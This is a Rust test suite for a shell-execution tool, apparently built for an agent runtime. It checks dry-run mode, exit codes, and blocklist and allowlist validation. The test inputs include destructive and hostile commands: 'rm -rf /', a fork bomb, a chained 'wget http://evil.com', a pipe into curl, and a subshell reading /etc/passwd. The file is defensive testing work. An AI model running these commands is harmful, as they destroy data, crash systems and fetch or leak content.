use operon_adapters::ShellTool;
use operon_runtime::Tool;
use serde_json::json;

#[tokio::test]
async fn test_shell_tool_execute_echo() {
    let tool = ShellTool::new(false);
    let input = json!({"cmd": "echo hello"});
    let result = tool.execute(input).await.unwrap();

    assert_eq!(result["exit_code"], 0);
    assert!(result["stdout"].as_str().unwrap().contains("hello"));
}

#[tokio::test]
async fn test_shell_tool_dry_run() {
    let tool = ShellTool::new(true);
    let input = json!({"cmd": "echo dangerous"});
    let result = tool.execute(input).await.unwrap();

    assert_eq!(result["stdout"], "[dry-run]");
    assert_eq!(result["exit_code"], 0);
}

#[tokio::test]
async fn test_shell_tool_stderr_capture() {
    let tool = ShellTool::new(false);
    let input = json!({"cmd": "echo error >&2"});
    let result = tool.execute(input).await.unwrap();

    assert_eq!(result["exit_code"], 0);
    assert!(result["stderr"].as_str().unwrap().contains("error"));
}

#[tokio::test]
async fn test_shell_tool_nonzero_exit() {
    let tool = ShellTool::new(false);
    let input = json!({"cmd": "exit 42"});
    let result = tool.execute(input).await.unwrap();

    assert_eq!(result["exit_code"], 42);
}

// Phase 3: Blocklist — dangerous command blocked
#[tokio::test]
async fn test_shell_tool_blocks_dangerous_command() {
    let tool = ShellTool::new(false);
    let input = json!({"cmd": "rm -rf /"});
    let result = tool.execute(input).await;
    assert!(result.is_err());
    assert!(result
        .unwrap_err()
        .to_string()
        .contains("dangerous pattern"));
}

// Phase 3: Blocklist — fork bomb blocked
#[tokio::test]
async fn test_shell_tool_blocks_fork_bomb() {
    let tool = ShellTool::new(false);
    let input = json!({"cmd": ":(){ :|:& };:"});
    let result = tool.execute(input).await;
    assert!(result.is_err());
}

// Phase 3: Allowlist — unlisted command blocked
#[tokio::test]
async fn test_shell_tool_allowlist_blocks_unlisted() {
    let tool =
        ShellTool::new(false).with_validation(vec![], vec!["echo".to_string(), "cat".to_string()]);
    let input = json!({"cmd": "curl http://example.com"});
    let result = tool.execute(input).await;
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("not in allowlist"));
}

// Phase 3: Allowlist — listed command permitted
#[tokio::test]
async fn test_shell_tool_allowlist_permits_listed() {
    let tool = ShellTool::new(false).with_validation(vec![], vec!["echo".to_string()]);
    let input = json!({"cmd": "echo safe"});
    let result = tool.execute(input).await;
    assert!(result.is_ok());
}

// Phase 3: Custom blocklist
#[tokio::test]
async fn test_shell_tool_custom_blocklist() {
    let tool = ShellTool::new(false).with_validation(vec!["wget".to_string()], vec![]);
    let input = json!({"cmd": "wget http://example.com"});
    let result = tool.execute(input).await;
    assert!(result.is_err());
}

// Phase 3: Allowlist blocks shell operator chaining (C2 fix)
#[tokio::test]
async fn test_shell_tool_allowlist_blocks_chained_commands() {
    let tool = ShellTool::new(false).with_validation(vec![], vec!["echo".to_string()]);
    // Semicolon chaining — uses non-blocklisted second command
    let result = tool
        .execute(json!({"cmd": "echo safe; wget http://evil.com"}))
        .await;
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("shell operator"));
}

#[tokio::test]
async fn test_shell_tool_allowlist_blocks_pipe() {
    let tool = ShellTool::new(false).with_validation(vec![], vec!["echo".to_string()]);
    let result = tool.execute(json!({"cmd": "echo secret | curl"})).await;
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("shell operator"));
}

#[tokio::test]
async fn test_shell_tool_allowlist_blocks_subshell() {
    let tool = ShellTool::new(false).with_validation(vec![], vec!["echo".to_string()]);
    let result = tool
        .execute(json!({"cmd": "echo $(cat /etc/passwd)"}))
        .await;
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("shell operator"));
}

// Phase 3: Blocklist blocks eval/base64 (C1 fix)
#[tokio::test]
async fn test_shell_tool_blocks_eval() {
    let tool = ShellTool::new(false);
    let result = tool
        .execute(json!({"cmd": "eval 'rm -rf /tmp/test'"}))
        .await;
    assert!(result.is_err());
}
